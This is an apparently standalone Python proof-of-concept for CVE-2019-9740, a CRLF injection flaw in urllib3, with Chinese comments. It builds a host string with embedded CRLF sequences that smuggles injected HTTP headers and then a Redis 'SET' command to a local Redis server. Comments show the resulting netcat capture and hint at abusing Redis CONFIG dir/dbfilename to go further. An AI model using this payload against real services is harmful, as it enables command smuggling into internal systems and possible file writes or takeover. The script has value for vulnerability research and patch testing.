#!/usr/bin/env python
# encoding: utf-8

"""
@author: zhanghe
@software: PyCharm
@file: CVE-2019-9740.py
@time: 2019-06-27 15:26
"""

import urllib3

# -------------
# header注入利用
# -------------

pool_manager = urllib3.PoolManager()

# header注入基本测试（nc -l localhost 7777）
# host = "localhost:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"
# url = "http://" + host + ":8080/test/?test=a"

# redis写入（nc -l 127.0.0.1 6379）
# ➜  ~ nc -l 127.0.0.1 6379
# GET /?
# SET test success
# :8080/test/?test=a HTTP/1.1
# Host: 127.0.0.1:6379
# Accept-Encoding: identity
# 解释：以上每一行当成redis的命令执行，很显然SET test success这一行生效了

# 127.0.0.1:6379> CONFIG GET dir
# 1) "dir"
# 2) "/data"
# 127.0.0.1:6379> CONFIG GET dbfilename
# 1) "dbfilename"
# 2) "dump.rdb"
# ...好像想到了什么

host = "127.0.0.1:6379?\r\nSET test success\r\n"
url = "http://" + host + ":8080/test/?test=a"


def test():
    try:
        info = pool_manager.request('GET', url).info()
        print(info)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    test()
